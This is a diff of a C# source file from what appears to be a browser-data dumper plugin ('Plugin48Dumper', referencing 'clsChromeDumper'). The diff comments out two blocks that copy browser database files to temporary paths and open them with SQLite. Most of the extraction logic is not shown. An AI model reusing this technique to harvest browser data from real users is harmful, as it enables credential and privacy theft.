@@ -1,7 +1,6 @@
 ﻿using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
-using System.Data.SQLite;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -11,7 +10,6 @@ using System.Threading.Tasks;
 using Plugin.Abstractions48;
 using Org.BouncyCastle.Asn1;
 using System.Security.Cryptography;
-using static Plugin48Dumper.clsChromeDumper;
 using System.Data;
 
 namespace Plugin48Dumper
@@ -176,6 +174,7 @@ namespace Plugin48Dumper
                 string szTempPath = fnNewTempFilePath();
                 File.Copy(szFilePath, szTempPath);
 
+                /*
                 string szConnStr = fnConnString(szTempPath);
                 using (var conn = new SQLiteConnection(szConnStr))
                 {
@@ -227,6 +226,8 @@ namespace Plugin48Dumper
                     }
                 }
 
+                */
+
                 File.Delete(szTempPath);
             }
 
@@ -249,6 +250,7 @@ namespace Plugin48Dumper
                 string szTempPath = fnNewTempFilePath();
                 File.Copy(szFilePath, szTempPath);
 
+                /*
                 string szConnStr = fnConnString(szTempPath);
                 using (var conn = new SQLiteConnection(szConnStr))
                 {
@@ -297,6 +299,7 @@ namespace Plugin48Dumper
                         }
                     }
                 }
+                */
 
                 File.Delete(szTempPath);
             }
